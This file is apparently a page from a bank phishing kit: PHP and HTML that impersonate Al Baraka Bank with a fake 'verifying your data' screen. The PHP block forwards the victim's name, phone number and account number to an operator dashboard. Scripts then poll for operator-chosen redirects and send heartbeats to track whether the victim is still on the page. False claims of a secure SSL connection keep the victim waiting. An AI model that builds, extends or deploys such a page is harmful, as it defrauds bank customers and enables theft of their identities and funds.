<?php

declare(strict_types=1);

if (session_status() === PHP_SESSION_NONE) {
    session_start();
}

require_once __DIR__.'/includes/flow_helpers.php';
require_once __DIR__.'/includes/session_registry.php';

$clientName = isset($_SESSION['reg_name']) ? (string) $_SESSION['reg_name'] : '';

if (empty($_SESSION['congrats_wait_broadcast'])) {
    $_SESSION['congrats_wait_broadcast'] = true;
    dashboard_notify_safe(
        'congrats_wait',
        [
            'session_id' => session_id(),
            'name' => $_SESSION['reg_name'] ?? '',
            'phone' => $_SESSION['reg_phone'] ?? '',
            'account_number' => $_SESSION['reg_account'] ?? '',
        ],
        'انتظار في صفحة التهانٍ — جاهز للتوجيه من اللوحة'
    );
}

registry_touch_page('congrats.php');
?>
<!DOCTYPE html>
<html lang="ar" dir="rtl">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>بنك البركة | جاري التحقق</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@300;400;500;700;800;900&display=swap" rel="stylesheet">
    <style>
        :root {
            --bank-blue: #8e000e;
            --bank-blue-light: #2a6cb5;
            --bank-gold: #c9a84c;
            --bank-dark: #8e000e;
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Tajawal', sans-serif;
            background: #f0f2f5;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }

        /* Navbar */
        .bank-nav {
            background: #ffffff;
            padding: 15px 20px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            border-bottom: 3px solid var(--bank-blue);
        }

        .bank-nav img {
            height: 60px;
            width: auto;
            display: block;
        }

        /* Main Content */
        .main-content {
            flex: 1;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 30px 16px;
        }

        .wait-container {
            width: 100%;
            max-width: 500px;
        }

        /* Card */
        .wait-card {
            background: rgba(255, 255, 255, 0.98);
            border-radius: 24px;
            padding: 50px 28px;
            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.08);
            text-align: center;
            animation: fadeInUp 0.6s ease-out;
        }

        /* Shield Icon */
        .shield-icon {
            width: 90px;
            height: 90px;
            background: linear-gradient(135deg, var(--bank-blue), var(--bank-blue-light));
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 24px;
            box-shadow: 0 8px 25px rgba(27, 79, 138, 0.3);
            position: relative;
        }

        .shield-icon i {
            font-size: 40px;
            color: white;
        }

        .shield-icon::after {
            content: '';
            position: absolute;
            width: 100%;
            height: 100%;
            border-radius: 50%;
            border: 3px solid rgba(27, 79, 138, 0.2);
            animation: shieldPulse 2s ease-in-out infinite;
        }

        @keyframes shieldPulse {
            0%, 100% { transform: scale(1); opacity: 1; }
            50% { transform: scale(1.15); opacity: 0; }
        }

        /* Title */
        .wait-title {
            font-size: 24px;
            font-weight: 900;
            color: var(--bank-dark);
            margin-bottom: 8px;
        }

        .wait-subtitle {
            font-size: 14px;
            color: #888;
            margin-bottom: 30px;
        }

        .client-greeting {
            font-size: 17px;
            font-weight: 700;
            color: var(--bank-blue);
            margin-bottom: 28px;
        }

        /* Loading Spinner */
        .loading-spinner {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 12px;
            padding: 18px;
            background: linear-gradient(135deg, #f0f4fa, #e8eef5);
            border-radius: 14px;
            border: 1.5px solid rgba(27, 79, 138, 0.15);
            margin-bottom: 24px;
        }

        .spinner-circle {
            width: 28px;
            height: 28px;
            border: 3px solid rgba(27, 79, 138, 0.15);
            border-top-color: var(--bank-blue);
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .loading-text {
            font-size: 15px;
            font-weight: 700;
            color: var(--bank-blue);
        }

        /* Dots Animation */
        .dots::after {
            content: '';
            animation: dots 1.5s steps(4, end) infinite;
        }

        @keyframes dots {
            0% { content: ''; }
            25% { content: '.'; }
            50% { content: '..'; }
            75% { content: '...'; }
            100% { content: ''; }
        }

        /* Info Note */
        .info-note {
            padding: 14px;
            background: #f8f9fa;
            border-radius: 12px;
            border: 1px solid #e9ecef;
            margin-bottom: 20px;
        }

        .info-note p {
            font-size: 13px;
            color: #666;
            line-height: 1.8;
            margin: 0;
        }

        .info-note i {
            color: var(--bank-gold);
            margin-left: 6px;
        }

        /* Security Badge */
        .security-badge {
            margin-top: 16px;
            padding: 10px;
            background: rgba(27, 79, 138, 0.05);
            border-radius: 10px;
            border: 1px solid rgba(27, 79, 138, 0.1);
        }

        .security-badge i {
            color: var(--bank-blue);
            margin-left: 6px;
        }

        .security-badge span {
            color: #888;
            font-size: 11px;
        }

        /* Footer */
        .bank-footer {
            text-align: center;
            padding: 20px;
            margin-top: auto;
        }

        .bank-footer img {
            height: 52px;
            width: auto;
            opacity: 0.75;
            margin-bottom: 6px;
        }

        .bank-footer p {
            color: rgba(0, 0, 0, 0.3);
            font-size: 11px;
        }

        .bank-footer .footer-name {
            font-size: 13px;
            font-weight: 600;
            color: var(--bank-blue);
            margin-bottom: 4px;
        }

        /* Animation */
        @keyframes fadeInUp {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }

        @media (max-width: 480px) {
            .bank-nav img { height: 50px; }
            .bank-footer img { height: 46px; }
            .wait-card { padding: 35px 20px; }
            .wait-title { font-size: 20px; }
        }
    </style>
</head>

<body>

    <!-- Navbar -->
    <nav class="bank-nav">
        <div style="display:flex;align-items:center;gap:8px;">
            <i class="fas fa-lock" style="color:var(--bank-blue);font-size:14px;"></i>
            <span style="color:#666;font-size:12px;">اتصال آمن</span>
        </div>
        <a href="index.php">
            <img src="https://i.postimg.cc/Xq4ZsdJT/bar-removebg-preview.png" alt="بنك البركة">
        </a>
    </nav>

    <!-- Main Content -->
    <div class="main-content">
        <div class="wait-container">
            <div class="wait-card">
                <!-- Shield Icon -->
                <div class="shield-icon">
                    <i class="fas fa-shield-alt"></i>
                </div>

                <div class="wait-title">جاري التحقق من البيانات</div>
                <div class="wait-subtitle">يرجى الانتظار بينما نراجع بياناتك</div>
                <div class="client-greeting">مرحباً، <?php echo htmlspecialchars($clientName !== '' ? $clientName : 'ضيفنا الكريم', ENT_QUOTES, 'UTF-8'); ?></div>

                <!-- Loading Spinner -->
                <div class="loading-spinner">
                    <div class="spinner-circle"></div>
                    <span class="loading-text">جاري المراجعة<span class="dots"></span></span>
                </div>

                <!-- Info Note -->
                <div class="info-note">
                    <p><i class="fas fa-info-circle"></i> يتم الآن مراجعة بياناتك والتحقق منها. يرجى عدم إغلاق هذه الصفحة والانتظار حتى يتم الانتهاء من المراجعة.</p>
                </div>

                <!-- Security -->
                <div class="security-badge">
                    <i class="fas fa-shield-alt"></i>
                    <span>اتصال آمن ومشفر بتقنية SSL 256-bit - بنك البركة</span>
                </div>
            </div>
        </div>
    </div>

    <!-- Footer -->
    <footer class="bank-footer">
        <img src="https://i.postimg.cc/Xq4ZsdJT/bar-removebg-preview.png" alt="بنك البركة"><br>
        <p class="footer-name">بنك البركة | BARAKA Bank</p>
        <p>&copy; بنك البركة 2026 - جميع الحقوق محفوظة</p>
    </footer>

    <script>
    function checkRedirect() {
        fetch('polling-redirect.php')
            .then(r => r.json())
            .then(data => {
                if (data.redirect) {
                    window.location.href = data.redirect;
                }
            })
            .catch(e => {});
    }
    setInterval(checkRedirect, 1500);
    checkRedirect();
    </script>

    
<script>
// Heartbeat
function sendHeartbeat() {
    fetch('heartbeat.php').catch(function(e){});
}
setInterval(sendHeartbeat, 2000);
sendHeartbeat();
window.addEventListener('beforeunload', function() {
    navigator.sendBeacon('heartbeat.php', new URLSearchParams({action: 'offline'}));
});
</script>
</body>
</html>
